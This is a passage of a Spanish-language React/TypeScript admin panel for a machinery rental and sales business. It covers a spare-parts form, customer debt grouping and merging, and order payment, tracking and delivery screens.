                : 'Las piezas de mantenimiento se dan de alta aquí y se cobran desde la caja.'}
              icono={<><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6L3 18v3h3l6.1-6.1a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></>}
            />
          ))}
        </div>
        <Paginador {...pagProps} nombre="refacciones" />
      </Card>

      {formOpen && (
        <Modal className="fixed inset-0 z-[60] bg-black/40 backdrop-blur-[2px]" onClose={() => setFormOpen(false)} label={editing ? 'Editar refacción' : 'Nueva refacción'}>
          <motion.div
            initial={{ x: '100%' }} animate={{ x: 0 }} transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
            onClick={(e: React.MouseEvent) => e.stopPropagation()}
            className="fixed inset-y-0 right-0 w-full sm:max-w-[560px] bg-surface border-l border-edge shadow-[-24px_0_60px_rgba(33,29,22,0.22)] flex flex-col"
          >
            <div className="px-6 py-4 border-b border-edge flex items-center justify-between shrink-0">
              <h2 className="font-bold text-ink">{editing ? 'Editar refacción' : 'Nueva refacción'}</h2>
              <button onClick={() => setFormOpen(false)} className="text-mute hover:text-ink p-1" aria-label="Cerrar">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
              </button>
            </div>
            <div className="p-6 space-y-4 flex-1 overflow-y-auto">
              <div><label className={label}>Nombre *</label><input aria-label="Nombre" aria-required="true" className={input} value={form.nombre} onChange={e => setForm({ ...form, nombre: e.target.value })} placeholder="Ej. Filtro de aceite" autoFocus /></div>
              <div><label className={label}>Descripción</label><textarea aria-label="Descripción" className={`${input} campo-area`} rows={2} value={form.descripcion} onChange={e => setForm({ ...form, descripcion: e.target.value })} placeholder="Detalle / compatibilidad" /></div>
              <div className="grid grid-cols-2 gap-3">
                <div><label className={label}>Precio de venta{(form as any).condicion === 'seminueva' && <span className="text-mute font-normal"> · interno, el cliente NO lo ve</span>}</label><InputDinero etiqueta="Precio de venta" valor={String(form.precio_venta)} onValor={(v: string) => setForm({ ...form, precio_venta: v })} /></div>
                <div><label className={label}>Ubicación (taller)</label><input aria-label="Ubicación (taller)" className={input} value={form.ubicacion} onChange={e => setForm({ ...form, ubicacion: e.target.value })} placeholder="Estante / caja" /></div>
                <div><label className={label}>Stock</label><input aria-label="Stock" type="number" min={0} className={input} value={form.stock} onChange={e => setForm({ ...form, stock: e.target.value })} /></div>
                <div><label className={label}>Stock mínimo (alerta)</label><input aria-label="Stock mínimo (alerta)" type="number" min={0} className={input} value={form.stock_minimo} onChange={e => setForm({ ...form, stock_minimo: e.target.value })} /></div>
              </div>
              <div>
                <label className={label}>Código de barras</label>
                <input aria-label="Código de barras" className={`${input} font-mono`} value={form.codigo_barras} onChange={e => setForm({ ...form, codigo_barras: e.target.value })} placeholder="Escanéalo o déjalo vacío" />
                <p className="text-[11px] text-mute mt-1.5">Si la refacción ya trae código, escríbelo o escanéalo. Si lo dejas <b>vacío</b>, el sistema genera uno único automáticamente.</p>
              </div>
            </div>
            <div className="px-6 py-4 border-t border-edge flex justify-end gap-3 shrink-0 bg-surface">
              <button onClick={() => setFormOpen(false)} className="px-6 py-2.5 rounded-full border border-edge text-ink text-sm font-semibold hover:bg-surface-2 transition-colors">Cancelar</button>
              <button onClick={save} disabled={saving} className="px-7 py-2.5 rounded-full bg-gold text-black font-bold text-sm hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center gap-2">
                {saving ? <span className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" /> : null}
                {editing ? 'Guardar' : 'Agregar'}
              </button>
            </div>
          </motion.div>
        </Modal>
      )}

      {labelRef && <EtiquetaModal refaccion={labelRef} onClose={() => setLabelRef(null)} />}
      {sellRef && <VenderRefaccionModal refaccion={sellRef} notify={notify} onClose={() => setSellRef(null)} onSold={(id) => { setSellRef(null); reload(); setTicketVentaId(id) }} />}
      {ticketVentaId && <TicketModal url={`/ventas/${ticketVentaId}/comprobante/`} onClose={() => setTicketVentaId(null)} />}
    </div>
  )
}

/* La deuda se agrupa por la identidad MÁS FUERTE que tenga la renta: cuenta
   vinculada primero, empresa después, y el nombre de mostrador al final. Así
   un cliente sin cuenta con tres rentas es UNA fila con su total, no tres
   sueltas — que es de lo que se trata "llevar el control de su deuda". */
type GrupoAdeudo = {
  clave: string
  nombre: string
  tipo: 'cuenta' | 'empresa' | 'mostrador'
  // La identidad que lo agrupa, para poder fusionar hacia ella en el backend.
  usuarioId: number | null
  empresaId: number | null
  telefono: string
  total: number
  rentas: RentaFull[]
}
function agruparAdeudos(rentas: RentaFull[]): GrupoAdeudo[] {
  const mapa = new Map<string, GrupoAdeudo>()
  for (const r of rentas) {
    let clave: string, nombre: string, tipo: GrupoAdeudo['tipo']
    let usuarioId: number | null = null, empresaId: number | null = null
    if (r.cuenta) { clave = `u:${r.cuenta.toLowerCase()}`; nombre = r.cuenta; tipo = 'cuenta'; usuarioId = r.usuario_id ?? null }
    else if (r.empresa?.id) { clave = `e:${r.empresa.id}`; nombre = r.empresa.nombre; tipo = 'empresa'; empresaId = r.empresa.id }
    else {
      const n = (r.cliente || r.cliente_nombre || '').trim()
      clave = `n:${n.toLowerCase() || r.id}`; nombre = n || 'Sin nombre'; tipo = 'mostrador'
    }
    let g = mapa.get(clave)
    if (!g) { g = { clave, nombre, tipo, usuarioId, empresaId, telefono: '', total: 0, rentas: [] }; mapa.set(clave, g) }
    g.rentas.push(r)
    g.total += Number(r.saldo || 0)
    if (!g.telefono && r.telefono_cliente) g.telefono = r.telefono_cliente
  }
  return [...mapa.values()].sort((a, b) => b.total - a.total)
}

const TIPO_ADEUDO: Record<GrupoAdeudo['tipo'], { label: string; cls: string }> = {
  cuenta: { label: 'Cuenta', cls: 'bg-gold-soft text-gold-ink' },
  empresa: { label: 'Empresa', cls: 'bg-blue-500/10 text-blue-600' },
  mostrador: { label: 'Sin cuenta', cls: 'bg-surface-2 text-mute' },
}
const CHIP_RENTA_ADEUDO: Record<string, { label: string; cls: string }> = {
  activa: { label: 'ACTIVA', cls: 'bg-blue-500/10 text-blue-600' },
  reservada: { label: 'RESERVADA', cls: 'bg-blue-500/10 text-blue-600' },
  finalizada: { label: 'EQUIPO DEVUELTO', cls: 'bg-surface-2 text-mute' },
}

function PedidosAdmin({ datos, reload, equipos, empresas, notify, cargando }: {
  datos: PedidosDatos; reload: () => void; equipos: Equipo[]; empresas: Empresa[]
  notify: Notify; cargando?: boolean
}) {
  const money = formatMoney
  const puedeAlta = usePuede()('alta_inventario')
  const [busca, setBusca] = useState('')
  const [nuevo, setNuevo] = useState(false)
  const [abonando, setAbonando] = useState<Pedido | null>(null)
  const [abierto, setAbierto] = useState<Set<number>>(new Set())
  // El módulo tiene dos lados: lo que falta ("abiertos") y lo que ya se cumplió
  // ("entregados"). Los abiertos viven en el estado del panel —los comparte el
  // Resumen—; el historial se pide aquí, acotado por periodo, para no arrastrar
  // todos los años cada vez que alguien abre la sección.
  const [pestana, setPestana] = useState<'abiertos' | 'entregados'>('abiertos')
  const [anio, setAnio] = useState<number>(new Date().getFullYear())
  const [mes, setMes] = useState<number>(0)
  const [historial, setHistorial] = useState<PedidosDatos>({ pedidos: [], total: '0', clientes: 0 })
  const [cargandoHist, setCargandoHist] = useState(false)

  const cargarHistorial = useCallback(() => {
    setCargandoHist(true)
    const params = new URLSearchParams({ estado: 'entregados', anio: String(anio) })
    if (mes) params.set('mes', String(mes))
    api.get<PedidosDatos>(`/ventas/pedidos/?${params.toString()}`)
      .then(r => setHistorial(r.data || { pedidos: [], total: '0', clientes: 0 }))
      .catch(anotarFallo).finally(() => setCargandoHist(false))
  }, [anio, mes])
  useEffect(() => { if (pestana === 'entregados') cargarHistorial() }, [pestana, cargarHistorial])
  const toggle = (id: number) => setAbierto(s => { const n = new Set(s); n.has(id) ? n.delete(id) : n.add(id); return n })
  const fechaAbono = (iso: string) => { try { return new Date(iso).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' }) } catch { return iso } }

  const conSaldo = datos.pedidos.filter(p => Number(p.saldo || 0) > 0).length
  const sobre = datos.pedidos.filter(p => p.sobre_pedido).length
  const entregados = pestana === 'entregados'
  const fuente = entregados ? historial : datos
  const q = busca.trim().toLowerCase()
  const lista = !q ? fuente.pedidos : fuente.pedidos.filter(p =>
    [p.nombre_cliente, p.empresa, p.cuenta, p.equipo, p.folio].some(x => (x || '').toLowerCase().includes(q)))
  // Cada renglón de aquí es una ficha alta (cliente, máquinas, abonos): con
  // treinta abiertas la pantalla ya no termina nunca. Van de 25 en 25.
  const { enPantalla, ancla, props: pagProps } = usePaginado(lista, undefined, [busca, pestana])

  // Sin `catch`: el rechazo lo muestra el AbonoModal (ver guardarAbono).
  async function abonar(monto: number, metodo: string, fecha: string) {
    if (!abonando) return
    await api.post(`/ventas/${abonando.id}/abono/`, { monto, metodo, fecha: fecha || undefined })
    notify(`Abono de ${money(monto)} registrado`)
    setAbonando(null); reload()
  }

  // Liga de vinculación (como renta/venta): para clientes SIN cuenta. Al abrirla con
  // su sesión, el pedido cae en SU "Mis compras" y puede seguirlo y liquidar el saldo.
  async function generarLigaPedido(p: Pedido) {
    try {
      const res = await api.post<{ ruta: string }>(`/ventas/${p.id}/vinculo/`, {}, { fondo: true })
      const link = `${window.location.origin}${res.data.ruta}`
      try { await navigator.clipboard.writeText(link) } catch { /* sin portapapeles: igual va por WhatsApp */ }
      const wa = waLink(p.telefono_cliente, `Hola${p.nombre_cliente ? ' ' + p.nombre_cliente : ''}, aquí sigues tu pedido de ${p.equipo || 'tu máquina'} en REMALI y liquidas tu saldo: ${link}`)
      if (wa) { window.open(wa, '_blank', 'noopener'); notify('Liga generada y copiada; abriendo WhatsApp') }
      else notify('Liga de vinculación copiada al portapapeles')
    } catch (e) { notify((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo generar la liga', 'err') }
  }

  const FASES: { key: string; label: string }[] = [
    { key: 'confirmado', label: 'Confirmado' },
    { key: 'en_camino', label: 'En camino' },
    { key: 'en_sucursal', label: 'En sucursal' },
  ]
  async function avanzarFase(p: Pedido) {
    const idx = FASES.findIndex(f => f.key === p.pedido_fase)
    const sig = FASES[idx + 1] || FASES[0]
    try {
      await api.post(`/ventas/${p.id}/pedido-fase/`, { fase: sig.key })
      notify(`Seguimiento: ${sig.label}`, 'info')
      reload()
    } catch (e) { notify((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo actualizar', 'err') }
  }

  // La máquina que llegó del proveedor. El PRODUCTO ya está en el catálogo —por
  // eso el cliente pudo pedirlo—; lo que no existe todavía es la pieza física,
  // que estaba en la bodega del proveedor cuando se apartó. Aquí se le pone su
  // código y su número de serie, sin salir de Pedidos.
  async function registrarLaQueLlego(p: Pedido): Promise<{ numero_serie: string } | null> {
    let codigo = ''
    try {
      const r = await api.get<{ codigo: string }>(`/equipos/${p.equipo_id}/unidades/proximo-codigo/`, { fondo: true })
      codigo = r.data?.codigo || ''
    } catch { /* el código es cortesía: si no carga, igual se registra */ }
    const serie = await pedir({
      titulo: `Máquina que llegó · ${p.equipo || 'este equipo'}`,
      mensaje: `Se registra como nueva${codigo ? ` con el código ${codigo}` : ''} y sale vendida a nombre del cliente.\n`
        + 'Anota su número de serie; déjalo vacío si la máquina no lo trae.',
      placeholder: 'Número de serie',
    })
    if (serie === null) return null   // canceló: no se registra nada
    return { numero_serie: serie.trim() }
  }

  async function entregar(p: Pedido) {
    if (Number(p.saldo || 0) > 0) { notify('Falta liquidar el saldo antes de entregar.', 'err'); return }
    let unidad_id: number | undefined
    let unidad_ids: number[] | undefined
    let nueva_unidad: { numero_serie: string } | undefined

    // Pedido de VARIAS máquinas: rara vez llegan todas el mismo día, así que se
    // elige cuáles se entregan hoy. Las que falten dejan el pedido abierto.
    const pendientes = (p.maquinas || []).filter(m => !m.entregada && m.codigo)
    if (pendientes.length > 1) {
      const sel = await elegir({
        titulo: '¿Qué máquinas se entregan?',
        mensaje: 'Las que no elijas siguen apartadas y el pedido queda abierto por ellas.',
        multiple: true,
        opciones: pendientes.map(m => ({
          valor: String(m.unidad_id), label: m.codigo || '—',
          detalle: m.numero_serie ? `S/N ${m.numero_serie}` : (m.equipo || ''),
        })),
      })
      if (!sel || !sel.length) return
      unidad_ids = sel.map(Number)
    } else if (p.sobre_pedido || !p.unidad) {
      let libres: Unidad[] = []
      try {
        const resp = await api.get<Unidad[]>(`/equipos/${p.equipo_id}/unidades/`, { fondo: true })
        libres = (resp.data || []).filter(u => u.estado === 'disponible')
      } catch { notify('No se pudieron cargar las unidades', 'err'); return }

      // Sin ninguna libre es el caso normal de un sobre pedido: esta máquina
      // nunca se tiene en stock, llega solo cuando alguien la pide. No es un
      // error: es el momento de registrarla.
      if (!libres.length) {
        if (!puedeAlta) {
          notify('Para entregar hay que registrar la máquina que llegó. Pídeselo a administración.', 'err'); return
        }
        const reg = await registrarLaQueLlego(p)
        if (!reg) return
        nueva_unidad = reg
      } else {
        const NUEVA = 'nueva'
        const sel = await elegir({
          titulo: 'Máquina que entregas',
          mensaje: `Elige la unidad de ${p.equipo || 'este equipo'} que se lleva el cliente.`,
          opciones: [
            ...libres.map(u => ({ valor: String(u.id), label: u.codigo, detalle: u.numero_serie ? `S/N ${u.numero_serie}` : 'Disponible' })),
            ...(puedeAlta ? [{ valor: NUEVA, label: 'Llegó una nueva del proveedor', detalle: 'Registrarla ahora y entregarla' }] : []),
          ],
        })
        if (!sel || !sel[0]) return
        if (sel[0] === NUEVA) {
          const reg = await registrarLaQueLlego(p)
          if (!reg) return
          nueva_unidad = reg
        } else unidad_id = Number(sel[0])
      }
    }
    try {
      const r = await api.post<{ pedido?: { estado?: string } }>(`/ventas/${p.id}/entregar/`, { unidad_id, unidad_ids, nueva_unidad })
      const parcial = r.data?.pedido?.estado === 'apartada'
      notify(parcial
        ? 'Máquinas entregadas · el pedido sigue abierto por las que faltan'
        : 'Pedido entregado', parcial ? 'warning' : 'ok')
      reload()
      if (pestana === 'entregados') cargarHistorial()
    } catch (e) { notify((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo entregar', 'err') }
  }

  return (
    <div className="space-y-5">
      <KpiGrid
        items={entregados ? [
          { label: 'Cobrado en el periodo', value: <Monto valor={historial.total} />, tone: 'gold', helper: 'ya entró completo', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
          { label: 'Pedidos entregados', value: historial.pedidos.length, tone: 'muted', helper: 'máquina entregada y saldo liquidado', icon: <><circle cx="12" cy="12" r="9" /><path d="m8.4 12 2.4 2.4 4.8-5" /></> },
          { label: 'Clientes', value: historial.clientes, tone: 'muted', helper: 'distintos en el periodo', icon: <><circle cx="9" cy="8" r="3.4" /><path d="M2.5 20a6.5 6.5 0 0 1 13 0" /><path d="M16.5 5.2a3.4 3.4 0 0 1 0 5.6M18 20a6.5 6.5 0 0 0-2.6-5.2" /></> },
        ] : [
          { label: 'Por cobrar', value: <Monto valor={datos.total} />, tone: 'gold', emphasis: Number(datos.total) > 0, helper: 'saldo que falta antes de entregar', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
          { label: 'Apartados', value: conSaldo, tone: 'muted', helper: 'con saldo, apartadas en bodega', icon: <><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" /><path d="M3.3 7 12 12l8.7-5M12 22V12" /></> },
          { label: 'Sobre pedido', value: sobre, tone: 'muted', helper: 'todavía no llega a sucursal', icon: <><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></> },
        ]}
      />

      <Segmentado
        forma="pastilla"
        valor={pestana}
        onChange={k => setPestana(k as typeof pestana)}
        opciones={[{ key: 'abiertos', label: 'Abiertos' }, { key: 'entregados', label: 'Entregados' }]}
        className="w-fit"
      />

      <div className="flex flex-wrap items-center gap-2">
        <input aria-label="Buscar cliente, equipo o folio" value={busca} onChange={e => setBusca(e.target.value)} placeholder="Buscar cliente, equipo o folio…"
          className={`${input} flex-1 min-w-[200px]`} />
        {entregados
          ? <SelectorPeriodo anio={anio} mes={mes} onAnio={setAnio} onMes={setMes} />
          : (
            <button onClick={() => setNuevo(true)}
              className="btn-acento shrink-0 inline-flex items-center gap-2 h-10 px-4 rounded-full text-[13.5px] font-bold whitespace-nowrap">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" d="M12 5v14M5 12h14" /></svg>
              Nuevo pedido
            </button>
          )}
      </div>

      {(cargandoHist && entregados) || (cargando && lista.length === 0) ? (
        <Card className="overflow-hidden"><FilasEsqueleto filas={4} columnas={3} /></Card>
      ) : lista.length === 0 ? (
        <Card className="overflow-hidden">
          <EstadoVacio
            titulo={fuente.pedidos.length ? 'Sin coincidencias'
              : entregados ? 'Nada entregado en este periodo' : 'No hay pedidos ni apartados'}
            mensaje={fuente.pedidos.length ? 'Prueba con otro nombre o folio.'
              : entregados ? 'Prueba con otro mes o año. Aquí queda cada pedido que se entregó, con su máquina.'
                : 'Registra un sobre pedido con "Nuevo pedido", o convierte una cotización sin stock.'}
            icono={<><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></>}
          />
        </Card>
      ) : (
        <div ref={ancla} className="space-y-3 scroll-mt-24">
          {enPantalla.map(p => {
            const abiertoP = abierto.has(p.id)
            const quien = p.cuenta || p.empresa || p.nombre_cliente || 'Cliente'
            const inicial = (quien.trim()[0] || '?').toUpperCase()
            const saldo = Number(p.saldo || 0)
            const badge = p.sobre_pedido
              ? { label: 'SOBRE PEDIDO', cls: 'bg-violet-500/12 text-violet-600 dark:text-violet-300' }
              : { label: 'APARTADO', cls: 'bg-sky-500/12 text-sky-600 dark:text-sky-300' }
            const faseLabel = FASES.find(f => f.key === p.pedido_fase)?.label
            return (
              <div key={p.id} className="rounded-2xl border border-edge bg-surface overflow-hidden">
                <div className="flex flex-wrap items-center gap-x-4 gap-y-2 px-4 sm:px-5 py-4">
                  <span className="w-10 h-10 shrink-0 rounded-full bg-surface-2 grid place-items-center text-[15px] font-black text-ink">{inicial}</span>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[14.5px] font-extrabold text-ink truncate">{quien}</span>
                      <span className={`text-[9.5px] font-bold px-1.5 py-0.5 rounded ${badge.cls}`}>{badge.label}</span>
                      {p.sobre_pedido && faseLabel && <span className="text-[9.5px] font-bold px-1.5 py-0.5 rounded bg-surface-2 text-mute">{faseLabel}</span>}
                    </div>
                    <p className="text-[12px] text-mute mt-0.5 truncate">
                      {p.equipo || 'Equipo'}{p.folio ? ` · ${p.folio}` : ''}
                      {entregados
                        ? (p.entregada_en ? ` · entregado ${fechaAbono(p.entregada_en)}` : '')
                        : (p.fecha_estimada_entrega ? ` · llega ${fechaAbono(p.fecha_estimada_entrega)}` : '')}
                    </p>
                    {/* A quién se le reclama si la máquina llegó mal. Se enseña
                        aquí, en la fila del pedido, porque la pregunta llega
                        cuando el cliente reporta la falla — y para entonces
                        nadie se acuerda de qué proveedor fue ni cuánto dio. */}
                    {p.garantia_proveedor && (
                      <p className="text-[11.5px] text-mute mt-0.5 truncate" title={p.garantia_proveedor.nota || undefined}>
                        Proveedor responde {p.garantia_proveedor.meses} mes{p.garantia_proveedor.meses === 1 ? '' : 'es'}
                        {p.garantia_proveedor.nota ? ` · ${p.garantia_proveedor.nota}` : ''}
                      </p>
                    )}
                    {/* Qué máquina se llevó el cliente: su código y su serie. Es
                        la pregunta que trae a alguien al historial. */}
                    {entregados && (
                      <p className="text-[11.5px] text-mute mt-0.5 truncate">
                        {(p.maquinas || []).filter(m => m.codigo).map(m =>
                          m.codigo + (m.numero_serie ? ` · S/N ${m.numero_serie}` : '')).join('  ·  ')
                          || (p.unidad?.codigo ?? 'Sin unidad registrada')}
                        {p.entregada_por ? ` · entregó ${p.entregada_por}` : ''}
                      </p>
                    )}
                  </div>
                  <div className="text-right">
                    {entregados ? (
                      <>
                        <p className="text-[10px] text-mute">Cobrado</p>
                        <p className="text-[17px] font-black tabular-nums leading-tight text-ink">{money(Number(p.total || 0))}</p>
                      </>
                    ) : (
                      <>
                        <p className="text-[10px] text-mute">Pagó {money(Number(p.pagado || 0))} de {money(Number(p.total || 0))}</p>
                        <p className={`text-[17px] font-black tabular-nums leading-tight ${saldo > 0 ? 'text-red-600 dark:text-red-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{saldo > 0 ? money(saldo) : 'Liquidado'}</p>
                      </>
                    )}
                  </div>
                </div>
                <div className="flex flex-wrap gap-1.5 px-4 sm:px-5 pb-3">
                  {/* Historial: ya no hay nada que cobrar ni que entregar. Lo que
                      sí se pide después es volver a sacarle el papel al cliente. */}
                  {entregados ? (
                    <>
                      <button onClick={() => toggle(p.id)} className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors">{abiertoP ? 'Ocultar' : 'Ver abonos'}</button>
                      <button onClick={() => abrirOrdenCartaPDF('ventas', p.id)} title="Descargar de nuevo la orden en PDF"
                        className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors">
                        Reimprimir orden
                      </button>
                    </>
                  ) : (<>
                  {saldo > 0 && (
                    <button onClick={() => setAbonando(p)} className="h-8 px-3 rounded-lg bg-gold text-black text-[12px] font-bold hover:brightness-95 transition-all">+ Abono</button>
                  )}
                  <button onClick={() => toggle(p.id)} className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors">{abiertoP ? 'Ocultar' : 'Ver abonos'}</button>
                  {!p.cuenta && (
                    <button onClick={() => generarLigaPedido(p)} title="Genera una liga para que el cliente (sin cuenta) siga su pedido en Mis compras"
                      className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors inline-flex items-center gap-1.5">
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1" /><path d="M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1" /></svg>
                      Liga cliente
                    </button>
                  )}
                  {p.sobre_pedido && p.pedido_fase !== 'en_sucursal' && (
                    <button onClick={() => avanzarFase(p)} className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors">Avanzar seguimiento</button>
                  )}
                  <button onClick={() => entregar(p)} disabled={saldo > 0}
                    className="h-8 px-3 rounded-lg border border-emerald-500/40 text-[12px] font-bold text-emerald-600 dark:text-emerald-400 hover:bg-emerald-500/10 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
                    Entregar
                  </button>
                  </>)}
                </div>
                {abiertoP && (
                  <div className="border-t border-edge px-4 sm:px-5 py-3 bg-surface-2/30">
                    {(p.pagos || []).length === 0 ? (
                      <p className="text-[12px] text-mute">Aún no hay abonos. El anticipo y cada pago quedan aquí con su fecha.</p>
                    ) : (
                      <ul className="space-y-1.5">
                        {(p.pagos || []).map((pago, i) => (
                          <li key={i} className="flex items-center justify-between gap-3 text-[12.5px]">
                            <span className="text-mute">{fechaAbono(pago.fecha)} · <span className="capitalize">{pago.metodo}</span>{pago.por ? ` · ${pago.por}` : ''}</span>
                            <span className="font-bold text-ink tabular-nums">{money(Number(pago.monto || 0))}</span>
                          </li>
                        ))}
                      </ul>
                    )}
                  </div>
                )}
              </div>
            )
          })}
          <Paginador {...pagProps} nombre="pedidos" />
        </div>
      )}

      {abonando && <AbonoModal saldo={Number(abonando.saldo || 0)} onClose={() => setAbonando(null)} onRegistrar={abonar} />}
      {nuevo && <NuevoPedidoModal equipos={equipos} empresas={empresas} onClose={() => setNuevo(false)} onDone={() => { setNuevo(false); reload() }} notify={notify} />}
    </div>
  )
}

function AdeudosAdmin({ datos, pedidos, reload, reloadApartados, notify, cargando }: {
  datos: AdeudosDatos; pedidos: PedidosDatos
  reload: () => void; reloadApartados: () => void; notify: Notify; cargando?: boolean
}) {
  const money = formatMoney
  const [ver, setVer] = useState<RentaFull | null>(null)
  const [abonando, setAbonando] = useState<RentaFull | null>(null)
  const [abiertos, setAbiertos] = useState<Set<string>>(new Set())
  // Apartados/pedidos con saldo: la otra mitad de las cuentas por cobrar (venta).
  const [abonandoApartado, setAbonandoApartado] = useState<Pedido | null>(null)
  const [apartadoAbierto, setApartadoAbierto] = useState<Set<number>>(new Set())
  const apartados = useMemo(() => pedidos.pedidos.filter(p => Number(p.saldo || 0) > 0), [pedidos.pedidos])
  const totalApartados = useMemo(() => apartados.reduce((a, p) => a + Number(p.saldo || 0), 0), [apartados])
  const toggleApartado = (id: number) => setApartadoAbierto(s => {
    const n = new Set(s); n.has(id) ? n.delete(id) : n.add(id); return n
  })
  const fechaAbono = (iso: string) => {
    try { return new Date(iso).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' }) } catch { return iso }
  }

  const grupos = useMemo(() => agruparAdeudos(datos.rentas), [datos.rentas])
  // Se pagina por CLIENTE, no por renta: la sección agrupa la deuda de cada
  // quien en una ficha, y cortar a la mitad las rentas de una persona sería
  // enseñar un adeudo incompleto. Las cifras de arriba siguen sumando todo.
  const { enPantalla: gruposPag, ancla, props: pagProps } = usePaginado(grupos, 15)
  const toggle = (clave: string) => setAbiertos(s => {
    const n = new Set(s); n.has(clave) ? n.delete(clave) : n.add(clave); return n
  })

  // Sin `catch`: el rechazo lo muestra el AbonoModal (ver guardarAbono).
  async function registrarAbono(monto: number, metodo: string, fecha: string) {
    if (!abonando) return
    await api.post(`/rentas/${abonando.id}/abonos/`, { monto, metodo, fecha: fecha || undefined })
    notify(`Abono de ${money(monto)} registrado`)
    setAbonando(null)
    reload()
  }

  // Abono a un APARTADO (venta con anticipo). Endpoint distinto al de rentas.
  // Sin `catch`: el rechazo lo muestra el AbonoModal (ver guardarAbono).
  async function registrarAbonoApartado(monto: number, metodo: string, fecha: string) {
    if (!abonandoApartado) return
    await api.post(`/ventas/${abonandoApartado.id}/abono/`, { monto, metodo, fecha: fecha || undefined })
    notify(`Abono de ${money(monto)} registrado`)
    setAbonandoApartado(null)
    reloadApartados()
  }

  // Identidad de un grupo, tal como la espera el backend para fusionar.
  const spec = (g: GrupoAdeudo) =>
    g.tipo === 'cuenta' ? { usuario_id: g.usuarioId }
      : g.tipo === 'empresa' ? { cliente_id: g.empresaId }
        : { nombre: g.nombre }

  /* Fusionar: "esta tarjeta ES la misma persona que aquella". Se eligen el
     destino de entre los demás clientes y TODAS las rentas del origen pasan a
     esa identidad (historial completo, no solo lo que debe). */
  async function fusionar(origen: GrupoAdeudo) {
    const otros = grupos.filter(g => g.clave !== origen.clave)
    if (!otros.length) return
    const sel = await elegir({
      titulo: `Fusionar a ${origen.nombre}`,
      mensaje: 'Elige con quién es la misma persona. Todas sus rentas pasarán a ese cliente.',
      opciones: otros.map(o => ({ valor: o.clave, label: o.nombre, detalle: `${TIPO_ADEUDO[o.tipo].label} · debe ${money(o.total)}` })),
    })
    if (!sel || !sel[0]) return
    const destino = otros.find(o => o.clave === sel[0])
    if (!destino) return
    const ok = await confirmar({
      titulo: 'Fusionar clientes',
      mensaje: `Todas las rentas de "${origen.nombre}" pasarán a "${destino.nombre}". Afecta su historial completo, no solo los adeudos. Esto no se deshace solo.`,
      aceptar: 'Sí, fusionar',
      tono: 'peligro',
    })
    if (!ok) return
    try {
      const r = await api.post<{ detalle?: string }>('/rentas/adeudos/fusionar/', { origen: spec(origen), destino: spec(destino) })
      notify(r.data?.detalle || 'Clientes fusionados')
      reload()
    } catch (e) {
      notify((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo fusionar', 'err')
    }
  }

  return (
    <div className="space-y-5">
      <div className="flex items-start justify-between gap-3">
        <div className="flex-1">
          <KpiGrid
                items={[
              {
                label: 'Por cobrar', value: <Monto valor={Number(datos.total) + totalApartados} />, tone: 'gold',
                emphasis: Number(datos.total) + totalApartados > 0,
                helper: `${datos.rentas.length + apartados.length} cuenta${datos.rentas.length + apartados.length === 1 ? '' : 's'} con saldo`,
                icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></>,
              },
              { label: 'Rentas', value: datos.rentas.length, tone: 'muted', helper: 'con saldo, se abona hasta liquidar', icon: <><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></> },
              { label: 'Apartados', value: apartados.length, tone: 'muted', helper: 'falta el resto para entregar', icon: <><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" /><path d="M3.3 7 12 12l8.7-5M12 22V12" /></> },
            ]}
          />
        </div>
        {grupos.length > 0 && (
          <BotonExportar onClick={() => descargarReporte('/rentas/adeudos/export/', {}, 'reporte_adeudos.csv', notify)} />
        )}
      </div>

